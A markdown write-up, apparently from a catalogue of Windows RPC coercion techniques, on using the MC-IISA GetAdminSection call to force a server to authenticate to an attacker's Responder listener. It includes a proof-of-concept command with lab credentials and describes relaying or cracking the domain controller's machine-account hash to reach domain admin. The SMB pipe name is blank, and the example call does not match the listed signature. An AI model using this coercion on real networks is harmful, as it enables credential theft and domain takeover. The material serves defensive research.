# MC-IISA - Remote call to GetAdminSection (opnum 3)

## Summary

+ **Protocol**: [[MC-IISA]: Internet Information Services (IIS) Application Host COM Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/488de90f-9710-45fb-b71a-6938733fafb6)

+ **Protocol UUID**: 31a83ea0-c0e4-4a2c-8a01-353cc2a4c60a

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`GetAdminSection`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/b8ca90fd-7c8c-4e8f-9ecc-3ecf640db266)

+ **Function operation number**: `3`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MC-IISA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/488de90f-9710-45fb-b71a-6938733fafb6) protocol (with uuid `31a83ea0-c0e4-4a2c-8a01-353cc2a4c60a` and version `0.0`) in order to perform remote procedure calls to functions in the [`MC-IISA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/488de90f-9710-45fb-b71a-6938733fafb6) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MC-IISA]: Internet Information Services (IIS) Application Host COM Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/488de90f-9710-45fb-b71a-6938733fafb6) and allows to call RPC functions of this protocol. We will then call the remote [`GetAdminSection`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/b8ca90fd-7c8c-4e8f-9ecc-3ecf640db266) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
GetAdminSection('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT GetAdminSection(
   [in] BSTR bstrSectionName,
   [in] BSTR bstrPath,
   [out, retval] IAppHostElement** ppAdminSection
 );
```

## References

+ Documentation of protocol [MC-IISA]: Internet Information Services (IIS) Application Host COM Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/488de90f-9710-45fb-b71a-6938733fafb6

+ Documentation of function `GetAdminSection`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/mc-iisa/b8ca90fd-7c8c-4e8f-9ecc-3ecf640db266